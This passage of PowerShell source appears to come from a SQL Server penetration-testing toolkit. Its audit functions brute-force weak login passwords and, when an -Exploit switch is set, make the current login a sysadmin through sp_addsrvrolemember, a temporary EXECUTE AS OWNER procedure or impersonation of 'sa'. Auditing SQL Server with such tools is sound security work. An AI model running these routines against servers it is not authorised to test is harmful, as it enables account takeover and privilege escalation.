        $Vulnerability = 'Weak Login Password'
        $Description   = 'One or more SQL Server logins is configured with a weak password.  This may provide unauthorized access to resources the affected logins have access to.'
        $Remediation   = 'Ensure all SQL Server logins are required to use a strong password. Consider inheriting the OS password policy.'
        $Severity      = 'High'
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = 'Use the affected credentials to log into the SQL Server, or rerun this command with -Exploit.'
        $Details       = ''
        $Reference     = 'https://msdn.microsoft.com/en-us/library/ms161959.aspx'
        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # -----------------------------------------------------------------
        # Check for the Vulnerability
        # Note: Typically a missing patch or weak configuration
        # -----------------------------------------------------------------

        # Create empty user / password lists
        $LoginList = @()
        $PasswordList = @()

        # Get logins for testing - file
        if($UserFile)
        {
            Write-Verbose -Message "$Instance - Getting logins from file..."
            Get-Content -Path $UserFile |
            ForEach-Object -Process {
                $LoginList += $_
            }
        }

        # Get logins for testing - variable
        if($TestUsername)
        {
            Write-Verbose -Message "$Instance - Getting supplied login..."
            $LoginList += $TestUsername
        }

        # Get logins for testing - fuzzed
        if(-not $NoUserEnum)
        {
            # Test connection to instance
            $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
                $_.Status -eq 'Accessible'
            }
            if($TestConnection)
            {
                # Check if sysadmin
                $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
                if($IsSysadmin -eq 'Yes')
                {
                    # Query for logins
                    Write-Verbose -Message "$Instance - Getting list of logins..."
                    Get-SQLServerLogin -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose |
                    Where-Object -FilterScript {
                        $_.PrincipalType -eq 'SQL_LOGIN'
                    } |
                    Select-Object -Property PrincipalName -ExpandProperty PrincipalName |
                    ForEach-Object -Process {
                        $LoginList += $_
                    }
                }
                else
                {
                    # Fuzz logins
                    Write-Verbose -Message "$Instance : Enumerating principal names from $FuzzNum principal IDs.."
                    Get-SQLFuzzServerLogin -Instance $Instance -GetPrincipalType -Username $Username -Password $Password -Credential $Credential -FuzzNum $FuzzNum -SuppressVerbose |
                    Where-Object -FilterScript {
                        $_.PrincipleType -eq 'SQL Login'
                    } |
                    Select-Object -Property PrincipleName -ExpandProperty PrincipleName |
                    ForEach-Object -Process {
                        $LoginList += $_
                    }
                }
            }
            else
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance - Connection Failed - Could not authenticate with provided credentials."
                }
                return
            }
        }

        # Check for users or return - count array
        if($LoginList.count -eq 0 -and (-not $FuzzLogins))
        {
            Write-Verbose -Message "$Instance - No logins have been provided."
            return
        }

        # Get passwords for testing - file
        if($PassFile)
        {
            Write-Verbose -Message "$Instance - Getting password from file..."
            Get-Content -Path $PassFile |
            ForEach-Object -Process {
                $PasswordList += $_
            }
        }

        # Get passwords for testing - variable
        if($TestPassword)
        {
            Write-Verbose -Message "$Instance - Getting supplied password..."
            $PasswordList += $TestPassword
        }

        # Check for provided passwords
        if($PasswordList.count -eq 0 -and ($NoUserAsPass))
        {
            Write-Verbose -Message "$Instance - No passwords have been provided."
            return
        }

        # Iternate through logins and perform dictionary attack
        Write-Verbose -Message "$Instance - Performing dictionary attack..."
        $LoginList |
        Select-Object -Unique |
        ForEach-Object -Process {
            $TargetLogin = $_
            $PasswordList |
            Select-Object -Unique |
            ForEach-Object -Process {
                $TargetPassword = $_

                $TestPass = Get-SQLConnectionTest -Instance $Instance -Username $TargetLogin -Password $TargetPassword -SuppressVerbose |
                Where-Object -FilterScript {
                    $_.Status -eq 'Accessible'
                }
                if($TestPass)
                {
                    # Check if guess credential is a sysadmin
                    $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $TargetLogin -Password $TargetPassword -SuppressVerbose |
                    Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
                    if($IsSysadmin -eq 'Yes')
                    {
                        $SysadminStatus = 'Sysadmin'
                    }
                    else
                    {
                        $SysadminStatus = 'Not Sysadmin'
                    }

                    Write-Verbose -Message "$Instance - Successful Login: User = $TargetLogin ($SysadminStatus) Password = $TargetPassword"

                    if($Exploit)
                    {
                        Write-Verbose -Message "$Instance - Trying to make you a sysadmin..."

                        # Check if the current login is a sysadmin
                        $IsSysadmin1 = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose |
                        Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
                        if($IsSysadmin1 -eq 'Yes')
                        {
                            Write-Verbose -Message "$Instance - You're already a sysadmin. Nothing to do."
                        }
                        else
                        {
                            Write-Verbose -Message "$Instance - You're not currently a sysadmin. Let's change that..."

                            # Add current user as sysadmin if login was successful
                            Get-SQLQuery -Instance $Instance -Username $TargetLogin -Password $TargetPassword -Credential $Credential -Query "EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin'" -SuppressVerbose

                            # Check if the current login is a sysadmin again
                            $IsSysadmin2 = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose |
                            Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
                            if($IsSysadmin2 -eq 'Yes')
                            {
                                $Exploited = 'Yes'
                                Write-Verbose -Message "$Instance - SUCCESS! You're a sysadmin now."
                            }
                            else
                            {
                                $Exploited = 'No'
                                Write-Verbose -Message "$Instance - Fail. We coudn't add you as a sysadmin."
                            }
                        }
                    }

                    # Add record
                    $Details = "The $TargetLogin ($SysadminStatus) is configured with the password $TargetPassword."
                    $IsVulnerable = 'Yes'
                    $IsExploitable = 'Yes'
                    $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                }
                else
                {
                    Write-Verbose -Message "$Instance - Failed Login: User = $TargetLogin Password = $TargetPassword"
                }
            }
        }

        # Test user as pass
        if(-not $NoUserAsPass)
        {
            $LoginList |
            Select-Object -Unique |
            ForEach-Object -Process {
                $TargetLogin = $_
                $TestPass = Get-SQLConnectionTest -Instance $Instance -Username $TargetLogin -Password $TargetLogin -SuppressVerbose |
                Where-Object -FilterScript {
                    $_.Status -eq 'Accessible'
                }
                if($TestPass)
                {
                    # Check if user/name combo has sysadmin
                    $IsSysadmin3 = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $TargetLogin -Password $TargetLogin -SuppressVerbose |
                    Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
                    if($IsSysadmin3 -eq 'Yes')
                    {
                        $SysadminStatus = 'Sysadmin'
                    }
                    else
                    {
                        $SysadminStatus = 'Not Sysadmin'
                    }

                    Write-Verbose -Message "$Instance - Successful Login: User = $TargetLogin ($SysadminStatus) Password = $TargetLogin"

                    if(($Exploit) -and $IsSysadmin3 -eq 'Yes')
                    {
                        # Check if the current login is a sysadmin
                        $IsSysadmin4 = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose |
                        Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
                        if($IsSysadmin4 -eq 'Yes')
                        {
                            Write-Verbose -Message "$Instance - You're already a sysadmin. Nothing to do."
                        }
                        else
                        {
                            Write-Verbose -Message "$Instance - You're not currently a sysadmin. Let's change that..."

                            # Add current user as sysadmin if login was successful
                            Get-SQLQuery -Instance $Instance -Username $TargetLogin -Password $TargetLogin -Credential $Credential -Query "EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin'" -SuppressVerbose

                            # Check if the current login is a sysadmin again
                            $IsSysadmin5 = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose |
                            Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin
                            if($IsSysadmin5 -eq 'Yes')
                            {
                                $Exploited = 'Yes'
                                Write-Verbose -Message "$Instance - SUCCESS! You're a sysadmin now."
                            }
                            else
                            {
                                $Exploited = 'No'
                                Write-Verbose -Message "$Instance - Fail. We coudn't add you as a sysadmin."
                            }
                        }
                    }

                    # Add record
                    $Details = "The $TargetLogin ($SysadminStatus) principal is configured with the password $TargetLogin."
                    $IsVulnerable = 'Yes'
                    $IsExploitable = 'Yes'
                    $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                }
                else
                {
                    Write-Verbose -Message "$Instance - Failed Login: User = $TargetLogin Password = $TargetLogin"
                }
            }
        }


        # -----------------------------------------------------------------
        # Check for exploit dependancies
        # Note: Typically secondary configs required for dba/os execution
        # -----------------------------------------------------------------
        # $IsExploitable = "No" or $IsExploitable = "Yes"
        # Check if the link is alive and verify connection + check if sysadmin


        # -----------------------------------------------------------------
        # Exploit Vulnerability
        # Note: Add the current user to sysadmin fixed server role
        # -----------------------------------------------------------------
        # $Exploited = "No" or $Exploited     = "Yes"   - check if login is a sysadmin

        # Status User
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Weak Login Password"
    }

    End
    {
        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData | Sort-Object -Property computername, instance, details
        }
    }
}


Function Invoke-SQLAuditRoleDbOwner
{
   
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')
    }

    Process
    {
        # Status User
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: DATABASE ROLE - DB_OWNER"

        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            # Status user
            Write-Verbose -Message "$Instance : CONNECTION FAILED"
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_OWNER"
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS"
        }

        # Grab server, login, and role information
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $ComputerName = $ServerInfo.ComputerName
        $CurrentLogin = $ServerInfo.CurrentLogin
        $CurrentLoginRoles = Get-SQLServerRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PrincipalName $CurrentLogin  -SuppressVerbose
        $CurrentPrincpalList = @()
        $CurrentPrincpalList += $CurrentLogin
        $CurrentPrincpalList += 'Public'
        $CurrentLoginRoles | ForEach-Object -Process {
            $CurrentPrincpalList += $_.RolePrincipalName
        }

        # --------------------------------------------
        # Set function meta data for report output
        # --------------------------------------------
        if($Exploit)
        {
            $TestMode  = 'Audit'
        }
        else
        {
            $TestMode  = 'Audit'
        }
        $Vulnerability = 'DATABASE ROLE - DB_OWNER'
        $Description   = 'The login has the DB_OWER role in one or more databases.  This may allow the login to escalate privileges to sysadmin if the affected databases are trusted and owned by a sysadmin.'
        $Remediation   = "If the permission is not required remove it.  Permissions are granted with a command like: EXEC sp_addrolemember 'DB_OWNER', 'MyDbUser', and can be removed with a command like:  EXEC sp_droprolemember 'DB_OWNER', 'MyDbUser'"
        $Severity      = 'Medium'
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        if($Username)
        {
            $ExploitCmd    = "Invoke-SQLAuditRoleDbOwner -Instance $Instance -Username $Username -Password $Password -Exploit"
        }
        else
        {
            $ExploitCmd    = "Invoke-SQLAuditRoleDbOwner -Instance $Instance -Exploit"
        }
        $Details       = ''
        $Dependancies = 'Affected databases must be owned by a sysadmin and be trusted.'
        $Reference     = 'https://msdn.microsoft.com/en-us/library/ms189121.aspx,https://msdn.microsoft.com/en-us/library/ms187861.aspx'
        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # -----------------------------------------------------------------
        # Check for the Vulnerability
        # Note: Typically a missing patch or weak configuration
        # -----------------------------------------------------------------

        # Iterate through each current login and their associated roles
        $CurrentPrincpalList|
        ForEach-Object -Process {
            # Check if login or role has the DB_OWNER roles in any databases
            $DBOWNER = Get-SQLDatabaseRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -RolePrincipalName DB_OWNER -PrincipalName $_ -SuppressVerbose

            # -----------------------------------------------------------------
            # Check for exploit dependancies
            # Note: Typically secondary configs required for dba/os execution
            # -----------------------------------------------------------------

            # Check for db ownerships
            if($DBOWNER)
            {
                # Add an entry for each database where the user has the db_owner role
                $DBOWNER|
                ForEach-Object -Process {
                    $DatabaseTarget = $_.DatabaseName
                    $PrincipalTarget = $_.PrincipalName

                    Write-Verbose -Message "$Instance : - $PrincipalTarget has the DB_OWNER role in the $DatabaseTarget database."
                    $IsVulnerable = 'Yes'

                    # Check if associated database is trusted and the owner is a sysadmin
                    $Depends = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseTarget -SuppressVerbose | Where-Object -FilterScript {
                        $_.is_trustworthy_on -eq 1 -and $_.OwnerIsSysadmin -eq 1
                    }

                    if($Depends)
                    {
                        $IsExploitable = 'Yes'
                        Write-Verbose -Message "$Instance : - The $DatabaseTarget database is set as trustworthy and is owned by a sysadmin. This is exploitable."

                        # -----------------------------------------------------------------
                        # Exploit Vulnerability
                        # Note: Add the current user to sysadmin fixed server role
                        # -----------------------------------------------------------------
                        if($Exploit)
                        {
                            # Check if user is already a sysadmin
                            $SysadminPreCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status
                            if($SysadminPreCheck -ne 1)
                            {
                                # Status user
                                Write-Verbose -Message "$Instance : - EXPLOITING: Verified that the current user ($CurrentLogin) is NOT a sysadmin."
                                Write-Verbose -Message "$Instance : - EXPLOITING: Attempting to add the current user ($CurrentLogin) to the sysadmin role by using DB_OWNER permissions..."

                                $SpQuery = "CREATE PROCEDURE sp_elevate_me
                                    WITH EXECUTE AS OWNER
                                    AS
                                    begin
                                    EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin'
                                end;"

                                # Add sp_elevate_me stored procedure
                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "$SpQuery" -SuppressVerbose -Database $DatabaseTarget

                                # Run sp_elevate_me stored procedure
                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query 'sp_elevate_me' -SuppressVerbose -Database $DatabaseTarget

                                # Remove sp_elevate_me stored procedure
                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query 'DROP PROC sp_elevate_me' -SuppressVerbose -Database $DatabaseTarget

                                # Verify the login was added successfully
                                $SysadminPostCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status
                                if($SysadminPostCheck -eq 1)
                                {
                                    Write-Verbose -Message "$Instance : - EXPLOITING: It was possible to make the current user ($CurrentLogin) a sysadmin!"
                                    $Exploited = 'Yes'
                                }
                                else
                                {

                                }
                            }
                            else
                            {
                                Write-Verbose -Message "$Instance : - EXPLOITING: It was not possible to make the current user ($CurrentLogin) a sysadmin."
                            }

                            #Add record
                            $Details = "$PrincipalTarget has the DB_OWNER role in the $DatabaseTarget database."
                            $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                        }
                        else
                        {
                            #Add record
                            $Details = "$PrincipalTarget has the DB_OWNER role in the $DatabaseTarget database."
                            $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                        }
                    }
                    else
                    {
                        #Add record
                        Write-Verbose -Message "$Instance : - The $DatabaseTarget is not exploitable."
                        $Details = "$PrincipalTarget has the DB_OWNER role in the $DatabaseTarget database, but this was not exploitable."
                        $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                    }
                }
            }
        }

        # Status User
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_OWNER"
    }

    End
    {
        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}


Function Invoke-SQLAuditRoleDbDdlAdmin
{
 
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')
    }

    Process
    {
        # Status User
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: DATABASE ROLE - DB_DDLAMDIN"

        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            # Status user
            Write-Verbose -Message "$Instance : CONNECTION FAILED"
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_DDLADMIN"
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS"
        }

        # Grab server, login, and role information
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $ComputerName = $ServerInfo.ComputerName
        $CurrentLogin = $ServerInfo.CurrentLogin
        $CurrentLoginRoles = Get-SQLServerRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PrincipalName $CurrentLogin  -SuppressVerbose
        $CurrentPrincpalList = @()
        $CurrentPrincpalList += $CurrentLogin
        $CurrentPrincpalList += 'Public'
        $CurrentLoginRoles | ForEach-Object -Process {
            $CurrentPrincpalList += $_.RolePrincipalName
        }

        # --------------------------------------------
        # Set function meta data for report output
        # --------------------------------------------
        if($Exploit)
        {
            $TestMode  = 'Audit'
        }
        else
        {
            $TestMode  = 'Audit'
        }
        $Vulnerability = 'DATABASE ROLE - DB_DDLADMIN'
        $Description   = 'The login has the DB_DDLADMIN role in one or more databases.  This may allow the login to escalate privileges to sysadmin if the affected databases are trusted and owned by a sysadmin, or if a custom assembly can be loaded.'
        $Remediation   = "If the permission is not required remove it.  Permissions are granted with a command like: EXEC sp_addrolemember 'DB_DDLADMIN', 'MyDbUser', and can be removed with a command like:  EXEC sp_droprolemember 'DB_DDLADMIN', 'MyDbUser'"
        $Severity      = 'Medium'
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = 'No exploit command is available at this time, but a custom assesmbly could be used.'
        $Details       = ''
        $Dependancies  = 'Affected databases must be owned by a sysadmin and be trusted. Or it must be possible to load a custom assembly configured for external access.'
        $Reference     = 'https://technet.microsoft.com/en-us/library/ms189612(v=sql.105).aspx'
        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # -----------------------------------------------------------------
        # Check for the Vulnerability
        # Note: Typically a missing patch or weak configuration
        # -----------------------------------------------------------------

        # Iterate through each current login and their associated roles
        $CurrentPrincpalList|
        ForEach-Object -Process {
            # Check if login or role has the DB_DDLADMIN roles in any databases
            $DBDDLADMIN = Get-SQLDatabaseRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -RolePrincipalName DB_DDLADMIN -PrincipalName $_ -SuppressVerbose

            # -----------------------------------------------------------------
            # Check for exploit dependancies
            # Note: Typically secondary configs required for dba/os execution
            # -----------------------------------------------------------------

            # Check for db ownerships
            if($DBDDLADMIN)
            {
                # Add an entry for each database where the user has the DB_DDLADMIN role
                $DBDDLADMIN|
                ForEach-Object -Process {
                    $DatabaseTarget = $_.DatabaseName
                    $PrincipalTarget = $_.PrincipalName

                    Write-Verbose -Message "$Instance : - $PrincipalTarget has the DB_DDLADMIN role in the $DatabaseTarget database."
                    $IsVulnerable = 'Yes'

                    # Check if associated database is trusted and the owner is a sysadmin
                    $Depends = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseTarget -SuppressVerbose | Where-Object -FilterScript {
                        $_.is_trustworthy_on -eq 1 -and $_.OwnerIsSysadmin -eq 1
                    }

                    if($Depends)
                    {
                        $IsExploitable = 'No'
                        Write-Verbose -Message "$Instance : - The $DatabaseTarget database is set as trustworthy and is owned by a sysadmin. This is exploitable."

                        # -----------------------------------------------------------------
                        # Exploit Vulnerability
                        # Note: Add the current user to sysadmin fixed server role
                        # -----------------------------------------------------------------
                        if($Exploit)
                        {
                            # Check if user is already a sysadmin
                            $SysadminPreCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status
                            if($SysadminPreCheck -ne 1)
                            {
                                # Status user
                                Write-Verbose -Message "$Instance : - EXPLOITING: Verified that the current user ($CurrentLogin) is NOT a sysadmin."
                                Write-Verbose -Message "$Instance : - EXPLOITING: Attempting to add the current user ($CurrentLogin) to the sysadmin role by using DB_OWNER permissions..."

                                # Attempt to add the current login to sysadmins fixed server role
                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "EXECUTE AS LOGIN = 'sa';EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin';Revert" -SuppressVerbose

                                # Verify the login was added successfully
                                $SysadminPostCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status
                                if($SysadminPostCheck -eq 1)
                                {
                                    Write-Verbose -Message "$Instance : - EXPLOITING: It was possible to make the current user ($CurrentLogin) a sysadmin!"
                                    $Exploited = 'Yes'
                                }
                                else
                                {

                                }
                            }
                            else
                            {
                                Write-Verbose -Message "$Instance : - EXPLOITING: It was not possible to make the current user ($CurrentLogin) a sysadmin."
                            }

                            #Add record
                            $Details = "$PrincipalTarget has the DB_DDLADMIN role in the $DatabaseTarget database."
                            $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                        }
                        else
                        {
                            #Add record
                            $Details = "$PrincipalTarget has the DB_DDLADMIN role in the $DatabaseTarget database."
                            $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                        }
                    }
                    else
                    {
                        #Add record
                        Write-Verbose -Message "$Instance : - The $DatabaseTarget is not exploitable."
                        $Details = "$PrincipalTarget has the DB_DDLADMIN role in the $DatabaseTarget database, but this was not exploitable."
                        $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                    }
                }
            }
        }

        # Status User
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: DATABASE ROLE - DB_DDLADMIN"
    }

    End
    {
        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}


Function Invoke-SQLAuditPrivImpersonateLogin
{
   
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit,
		
		[Parameter(Mandatory = $false,
        HelpMessage = 'Exploit Nested Impersonation Capabilites.')]
        [switch]$Nested
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Status user
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN"

        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            # Status user
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN"
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS."
        }

        # Grab server information
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $CurrentLogin = $ServerInfo.CurrentLogin

        # ---------------------------------------------------------------
        # Set function meta data for report output
        # ---------------------------------------------------------------
        if($Exploit)
        {
            $TestMode  = 'Audit'
        }
        else
        {
            $TestMode  = 'Audit'
        }
        $Vulnerability = 'Excessive Privilege - Impersonate Login'
